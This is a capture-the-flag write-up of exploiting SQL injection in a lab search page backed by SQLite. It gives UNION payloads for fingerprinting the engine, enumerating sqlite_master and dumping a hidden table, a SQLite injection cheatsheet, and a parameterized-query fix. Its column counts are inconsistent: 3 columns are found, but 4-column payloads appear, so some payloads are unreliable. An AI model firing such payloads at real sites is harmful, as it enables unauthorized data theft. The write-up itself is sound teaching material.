Challenge Description

The challenge lore read:

"The archives of Alfheim are meant to preserve only what the scribes choose to reveal. Most visitors see polished records, curated entries, and harmless search results. But rumors speak of sealed tablets hidden from ordinary eyes."

We were presented with a search interface at http://lab.redfoxsec.com:8402/. The challenge description mentioned "search results" and "sealed tablets" — a clear hint that a hidden database table contained the flag, accessible only through SQL injection.

Step 1 — Confirming SQL Injection

The first step is always to test if the input is vulnerable. We sent a single quote to break the SQL string and observe the response:

test payload 
'

The server returned a database error — confirming the input was being passed directly into a SQL query without sanitization. This is a classic SQL injection vulnerability.

Step 2 — Identifying the Database Engine

The most important step in SQL injection is identifying which database engine is running. Different databases have different syntax, system tables, and string functions. We started with the most common approach — querying information_schema.tables:

first attempt — mysql / postgresql syntax 
' UNION SELECT table_name, 'a', 1, 'b' FROM information_schema.tables WHERE table_schema='public'--

Error response:

error 
no such table: information_schema.tables
⚡ Critical Clue

The error message "no such table: information_schema.tables" is extremely revealing. MySQL and PostgreSQL both have information_schema. The only common database that does NOT is SQLite — which uses sqlite_master instead.

Database Engine Comparison

Different databases use different system tables for schema introspection. Knowing which to use is the key to successful enumeration:

MySQL
information_schema.tables
WHERE table_schema = database()
PostgreSQL
information_schema.tables
WHERE table_schema = 'public'
SQLite ✓
sqlite_master
WHERE type = 'table'
THIS ONE

Step 3 — Finding the Column Count

Before a UNION attack can work, the injected query must return the same number of columns as the original query. We used ORDER BY to find the column count — incrementing until we got an error:

column count detection 
' ORDER BY 1--   → OK
' ORDER BY 2--   → OK
' ORDER BY 3--   → OK
' ORDER BY 4--   → ERROR ← column count is 3

The query has 3 columns. All our UNION payloads must also return exactly 3 columns.

Step 4 — Enumerating Tables with sqlite_master

SQLite stores all schema information in a built-in table called sqlite_master. We queried it to list all user-created tables:

sqlite table enumeration 
' UNION SELECT name, 'a', 1 FROM sqlite_master WHERE type='table'--

Response revealed:

output 
sealed_tablets   ← the hidden table!

Step 5 — Extracting the Schema

Now that we had the table name, we extracted its full schema from sqlite_master using the sql column which stores the original CREATE TABLE statement:

schema extraction 
' UNION SELECT sql, 'a', 1 FROM sqlite_master WHERE type='table' AND name='sealed_tablets'--

Response — the full CREATE TABLE statement:

sql 
CREATE TABLE sealed_tablets (
  id    INTEGER PRIMARY KEY,
  title TEXT,
  slug  TEXT UNIQUE,
  body  TEXT   ← flag lives here
)
⚡ Schema Found

The table has 4 columns: id, title, slug, body. The flag is almost certainly in the body column — matching the "sealed tablets" narrative of hidden content.

Step 6 — Dumping the Flag

With the table structure known, we dumped all content from sealed_tablets using a clean UNION payload matching all 4 columns:

final payload — dump all data 
' UNION SELECT title, body, slug FROM sealed_tablets--

Or targeting just the body column:

targeted payload 
' UNION SELECT body, 'a', 1 FROM sealed_tablets--

Response:

output

How UNION-Based SQLi Works

UNION injection works by appending a second SELECT statement to the original query. The original query might look like this internally:

vulnerable server code (conceptual) 
# Vulnerable query construction — NO parameterization
search_term = request.get("q")  # user input, unfiltered
query = f"SELECT title, slug, body FROM records WHERE title LIKE '%{search_term}%'"

# When search_term = "test' UNION SELECT body,'a',1 FROM sealed_tablets--"
# The query becomes:
# SELECT title, slug, body FROM records WHERE title LIKE '%test'
# UNION SELECT body,'a',1 FROM sealed_tablets--  %'
# The -- comments out the rest, and UNION appends our results!
// how the injected query breaks down
SELECT title, slug, body FROM records WHERE title LIKE '%test' UNION SELECT body, 'a', 1 FROM sealed_tablets -- %'

Error-Based DB Fingerprinting

The error message we received was one of the most useful clues in the challenge. Understanding what errors indicate which database is a core SQLi skill:

Error Message Database Use Instead
no such table: information_schema.tables SQLite sqlite_master
Table 'x.information_schema' doesn't exist MySQL information_schema.tables WHERE table_schema=database()
relation "information_schema.tables" does not exist PostgreSQL information_schema.tables WHERE table_schema='public'
ORA-00942: table or view does not exist Oracle all_tables / user_tables
Invalid object name 'information_schema.tables' MSSQL information_schema.tables or sysobjects

SQLite SQLi Cheatsheet

SQLite has some quirks compared to MySQL and PostgreSQL that are useful to know during CTFs:

sqlite injection cheatsheet 
-- List all tables
' UNION SELECT name,'a',1,'b' FROM sqlite_master WHERE type='table'--

-- Get CREATE TABLE statement (reveals all columns)
' UNION SELECT sql,'a',1,'b' FROM sqlite_master WHERE name='target_table'--

-- Dump specific column
' UNION SELECT column_name,'a',1,'b' FROM target_table--

-- Concatenate multiple columns
' UNION SELECT col1||':'||col2,'a',1,'b' FROM target_table--

-- SQLite version
' UNION SELECT sqlite_version(),'a',1,'b'--

The Fix — Parameterized Queries

SQL injection is completely preventable with one change: never concatenate user input into SQL strings. Use parameterized queries (prepared statements) instead.

python — vulnerable vs secure 
# ❌ VULNERABLE — string concatenation
search = request.args.get('q')
query = f"SELECT * FROM records WHERE title LIKE '%{search}%'"
cursor.execute(query)  # attacker controls the SQL!

# ✅ SECURE — parameterized query
search = request.args.get('q')
query = "SELECT * FROM records WHERE title LIKE ?"
cursor.execute(query, (f'%{search}%',))  # input treated as data, not SQL

# ✅ SECURE — with SQLAlchemy ORM
results = db.session.query(Record).filter(
    Record.title.like(f'%{search}%')
).all()  # ORM handles parameterization automatically

Additional hardening: Never display raw database errors to users — they reveal schema info and DB engine. Use generic error pages in production. Also apply least-privilege DB accounts so the app user can't access tables it doesn't need.
